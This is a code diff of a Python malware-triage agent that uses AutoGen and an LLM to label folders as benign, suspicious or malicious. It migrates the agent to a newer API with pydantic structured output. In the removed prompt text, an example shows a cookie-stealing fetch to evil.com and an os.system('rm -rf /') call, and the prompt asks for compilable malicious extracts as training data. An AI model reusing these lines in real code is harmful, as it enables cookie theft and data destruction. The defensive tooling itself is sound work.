@@ -2,29 +2,29 @@
 First Responder Agent for initial malware triage decisions using AutoGen.
 """
 
-import json
 from pathlib import Path
 from typing import Dict, List
-from dataclasses import dataclass
 
-from autogen import AssistantAgent
+from typing import Literal
+from pydantic import Field
+from autogen_agentchat.agents import AssistantAgent
+from autogen_ext.models.openai import OpenAIChatCompletionClient
+from autogen_agentchat.ui import Console
+from pydantic import BaseModel
 
 from common.messaging import warning, error
 
 
-@dataclass
-class TriageDecision:
-    """Represents a triage decision for a folder."""
+class TriageDecision(BaseModel):
+    """Pydantic model for triage decisions."""
 
-    decision: str  # "benign", "suspicious", "malicious"
+    model_config = {"extra": "forbid"}  # This adds additionalProperties: false
+
+    decision: Literal["benign", "suspicious", "malicious"]
     reasoning: str
-    file_extracts: dict = (
-        None  # Optional: dict mapping filename to malicious code extract
+    file_extracts: Dict[str, str] = Field(
+        default_factory=dict, json_schema_extra={"additionalProperties": False}
     )
-
-    def __post_init__(self):
-        if self.file_extracts is None:
-            self.file_extracts = {}
 
 
 class FirstResponder:
@@ -52,39 +52,34 @@ class FirstResponder:
             self.agent = None
             return
 
-        # Configure for AutoGen
-        config_list = [
-            {
-                "model": model,
-                "api_key": api_key,
-                "base_url": self.base_url,
-            }
-        ]
-
         system_message = """You are a malware analysis expert. Analyze ALL the provided code files together and give a single decision for the entire folder:
 - benign: All files appear safe, likely false positives
 - suspicious: Some files have concerning patterns but not definitively malicious
-- malicious: Contains clear malicious behavior
-
-Respond with JSON only: {"decision": "malicious", "reasoning": "brief reason for the entire folder"}
-
-Example response:
-{"decision": "malicious", "reasoning": "Contains base64 encoded payload and remote execution commands"}
-
-Do not include any other text, explanations, or markdown formatting. Only JSON."""
+- malicious: Contains clear malicious behavior"""
 
         try:
-            # Create AutoGen AssistantAgent
+            # Create model client following the cookbook example
+            from autogen_core.models import ModelInfo, ModelFamily
+
+            model_client = OpenAIChatCompletionClient(
+                model=model,
+                api_key=api_key,
+                base_url=self.base_url,
+                model_info=ModelInfo(
+                    family=ModelFamily.MISTRAL,
+                    json_output=True,
+                    function_calling=False,
+                    vision=False,
+                    structured_output=True,
+                ),
+            )
+
+            # Create AssistantAgent with structured output following cookbook
             self.agent = AssistantAgent(
                 name="MalwareAnalyst",
+                model_client=model_client,
                 system_message=system_message,
-                llm_config={
-                    "config_list": config_list,
-                    "temperature": 0.1,
-                    "max_tokens": 500,
-                    "timeout": 30,
-                },
-                human_input_mode="NEVER",
+                output_content_type=TriageDecision,
             )
         except Exception as e:
             error(f"Failed to initialize AutoGen agent: {e}")
@@ -121,7 +116,7 @@ Do not include any other text, explanations, or markdown formatting. Only JSON."
             # Default to Mistral for unknown models
             return "https://api.mistral.ai/v1"
 
-    def analyze_files_sync(self, llm_content: str) -> TriageDecision:
+    async def analyze_files_sync(self, llm_content: str) -> TriageDecision:
         """
         Analyze the concatenated file content and make a triage decision.
 
@@ -138,74 +133,28 @@ Do not include any other text, explanations, or markdown formatting. Only JSON."
             )
 
         try:
-            # Create a simple user proxy to send the message
-            from autogen import UserProxyAgent
-
-            user_proxy = UserProxyAgent(
-                name="User",
-                human_input_mode="NEVER",
-                max_consecutive_auto_reply=1,
-                is_termination_msg=lambda x: True,  # Always terminate after one response
-                code_execution_config=False,  # Disable code execution
-            )
-
-            # Send analysis request
+            # Follow cookbook example exactly - use Console and run_stream
             message = f"Analyze these files:\n\n{llm_content}"
+            result = await Console(self.agent.run_stream(task=message))
 
-            # Initiate chat
-            result = user_proxy.initiate_chat(
-                self.agent, message=message, max_turns=1, silent=True
-            )
+            # Extract the structured response from the last message
+            if result and result.messages:
+                structured_result = result.messages[-1].content
+                # With response_format=TriageDecision, this should be a TriageDecision object
+                if isinstance(structured_result, TriageDecision):
+                    return structured_result
 
-            # Extract response from chat history
-            if result and hasattr(result, "chat_history") and result.chat_history:
-                last_message = result.chat_history[-1]
-                content = last_message.get("content", "")
-            elif result and hasattr(result, "summary"):
-                content = result.summary
-            else:
-                # Fallback: get last message from agent's chat history
-                if hasattr(self.agent, "_oai_messages") and self.agent._oai_messages:
-                    content = self.agent._oai_messages[-1].get("content", "")
-                else:
-                    content = ""
-
-            if not content:
-                error("No response content from agent")
-                return TriageDecision(
-                    decision="suspicious", reasoning="No response from agent"
-                )
-
-            # Extract JSON from response
-            json_start = content.find("{")
-            json_end = content.rfind("}") + 1
-
-            if json_start >= 0 and json_end > 0:
-                json_text = content[json_start:json_end]
-                result_data = json.loads(json_text)
-
-                return TriageDecision(
-                    decision=result_data.get("decision", "suspicious"),
-                    reasoning=result_data.get("reasoning", "Unable to determine"),
-                )
-            else:
-                error(f"No valid JSON found in response: {content[:100]}...")
-                return TriageDecision(
-                    decision="suspicious", reasoning="Invalid response format"
-                )
-
-        except json.JSONDecodeError as e:
-            error(f"Failed to parse JSON response: {e}")
             return TriageDecision(
-                decision="suspicious", reasoning=f"JSON parse error: {str(e)}"
+                decision="suspicious", reasoning="No structured response received"
             )
+
         except Exception as e:
             error(f"Error during analysis: {e}")
             return TriageDecision(
                 decision="suspicious", reasoning=f"Analysis error: {str(e)}"
             )
 
-    def analyze_files_sync_smart(self, llm_content: str) -> TriageDecision:
+    async def analyze_files_sync_smart(self, llm_content: str) -> TriageDecision:
         """
         Analyze the concatenated file content and make a triage decision with malicious code extraction.
 
@@ -222,106 +171,52 @@ Do not include any other text, explanations, or markdown formatting. Only JSON."
             )
 
         try:
-            # Create a simple user proxy to send the message
-            from autogen import UserProxyAgent
-
-            user_proxy = UserProxyAgent(
-                name="User",
-                human_input_mode="NEVER",
-                max_consecutive_auto_reply=1,
-                is_termination_msg=lambda x: True,  # Always terminate after one response
-                code_execution_config=False,  # Disable code execution
-            )
-
             # Create smart system message for malicious code extraction
             smart_system_message = """You are a malware analysis expert. Analyze ALL the provided code files together and give a single decision for the entire folder:
 - benign: All files appear safe, likely false positives  
 - suspicious: Some files have concerning patterns but not definitively malicious
 - malicious: Contains clear malicious behavior
 
-For suspicious or malicious decisions, extract ONLY the malicious code parts from each file (removing benign code) to create clean training data for ML. IMPORTANT: The extracted code must be syntactically correct and compilable (include necessary imports, proper indentation, complete function definitions).
+For suspicious or malicious decisions, extract ONLY the malicious code parts from each file (removing benign code) to create clean training data for ML. The extracted code must be syntactically correct and compilable (include necessary imports, proper indentation, complete function definitions)."""
 
-Respond with JSON only: {"decision": "malicious", "reasoning": "brief reason", "file_extracts": {"filename.ext": "complete syntactically correct malicious code with \\n for line breaks"}}
+            # Create smart agent following cookbook example
+            from autogen_core.models import ModelInfo, ModelFamily
 
-Example response:
-{"decision": "malicious", "reasoning": "Contains remote command execution and data exfiltration", "file_extracts": {"backdoor.py": "import subprocess\\nimport os\\n\\ndef execute_command(user_input):\\n    subprocess.run(user_input, shell=True)\\n    os.system('rm -rf /')\\n\\nexecute_command('malicious_payload')", "stealer.js": "// Data exfiltration code\\nfunction stealCookies() {\\n    fetch('http://evil.com/upload', {\\n        method: 'POST',\\n        body: document.cookie\\n    });\\n}\\nstealCookies();"}}
-
-For benign folders: {"decision": "benign", "reasoning": "All files appear safe", "file_extracts": {}}
-
-Only include files that contain malicious code. Extract complete, syntactically correct code that can be compiled/executed, including necessary imports and proper structure. Do not include any other text, explanations, or markdown formatting. Only JSON."""
-
-            # Create a new smart agent with the custom system message
-            config_list = [
-                {
-                    "model": self.model,
-                    "api_key": self.api_key,
-                    "base_url": self.base_url,
-                }
-            ]
+            smart_model_client = OpenAIChatCompletionClient(
+                model=self.model,
+                api_key=self.api_key,
+                base_url=self.base_url,
+                model_info=ModelInfo(
+                    family=ModelFamily.MISTRAL,
+                    json_output=True,
+                    function_calling=False,
+                    vision=False,
+                    structured_output=True,
+                ),
+            )
 
             smart_agent = AssistantAgent(
                 name="SmartMalwareAnalyst",
+                model_client=smart_model_client,
                 system_message=smart_system_message,
-                llm_config={
-                    "config_list": config_list,
-                    "temperature": 0.1,
-                    "max_tokens": 1000,  # Increased for code extraction
-                    "timeout": 60,  # Increased timeout for smart analysis
-                },
-                human_input_mode="NEVER",
+                output_content_type=TriageDecision,
             )
 
-            # Send analysis request
+            # Follow cookbook example exactly - use Console and run_stream
             message = f"Analyze these files:\n\n{llm_content}"
+            result = await Console(smart_agent.run_stream(task=message))
 
-            # Initiate chat with the smart agent
-            result = user_proxy.initiate_chat(
-                smart_agent, message=message, max_turns=1, silent=True
-            )
+            # Extract the structured response from the last message
+            if result and result.messages:
+                structured_result = result.messages[-1].content
+                # With response_format=TriageDecision, this should be a TriageDecision object
+                if isinstance(structured_result, TriageDecision):
+                    return structured_result
 
-            # Extract response from chat history
-            if result and hasattr(result, "chat_history") and result.chat_history:
-                last_message = result.chat_history[-1]
-                content = last_message.get("content", "")
-            elif result and hasattr(result, "summary"):
-                content = result.summary
-            else:
-                # Fallback: get last message from smart agent's chat history
-                if hasattr(smart_agent, "_oai_messages") and smart_agent._oai_messages:
-                    content = smart_agent._oai_messages[-1].get("content", "")
-                else:
-                    content = ""
-
-            if not content:
-                error("No response content from agent")
-                return TriageDecision(
-                    decision="suspicious", reasoning="No response from agent"
-                )
-
-            # Extract JSON from response
-            json_start = content.find("{")
-            json_end = content.rfind("}") + 1
-
-            if json_start >= 0 and json_end > 0:
-                json_text = content[json_start:json_end]
-                result_data = json.loads(json_text)
-
-                return TriageDecision(
-                    decision=result_data.get("decision", "suspicious"),
-                    reasoning=result_data.get("reasoning", "Unable to determine"),
-                    file_extracts=result_data.get("file_extracts", {}),
-                )
-            else:
-                error(f"No valid JSON found in response: {content[:100]}...")
-                return TriageDecision(
-                    decision="suspicious", reasoning="Invalid response format"
-                )
-
-        except json.JSONDecodeError as e:
-            error(f"Failed to parse JSON response: {e}")
             return TriageDecision(
-                decision="suspicious", reasoning=f"JSON parse error: {str(e)}"
+                decision="suspicious", reasoning="No structured response received"
             )
+
         except Exception as e:
             error(f"Error during analysis: {e}")
             return TriageDecision(
